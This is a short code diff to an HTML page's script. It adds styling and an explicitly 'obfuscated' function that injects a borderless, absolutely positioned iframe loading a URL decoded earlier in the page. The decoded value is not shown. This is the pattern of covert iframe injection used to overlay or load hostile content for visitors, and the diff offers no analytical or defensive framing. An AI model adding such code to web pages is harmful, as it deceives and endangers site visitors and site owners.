@@ -30,9 +30,30 @@
         iframe.width = "600";
         iframe.height = "400";
         iframe.style.border = "none";
+        iframe.style.display = "block"; // Ensure the iframe is visible
+        iframe.style.position = "absolute"; // Position the iframe absolutely
+        iframe.style.top = "0"; // Position at the top
+        iframe.style.left = "0"; // Position at the left
 
         // Append the iframe to the body
         document.body.appendChild(iframe);
+
+        // Function to obfuscate the iframe creation
+        function createIframe(url) {
+            var iframe = document.createElement("iframe");
+            iframe.src = url;
+            iframe.width = "600";
+            iframe.height = "400";
+            iframe.style.border = "none";
+            iframe.style.display = "block";
+            iframe.style.position = "absolute";
+            iframe.style.top = "0";
+            iframe.style.left = "0";
+            document.body.appendChild(iframe);
+        }
+
+        // Call the obfuscated function to create the iframe
+        createIframe(decodedUrl);
     </script>
 </body>
 </html>
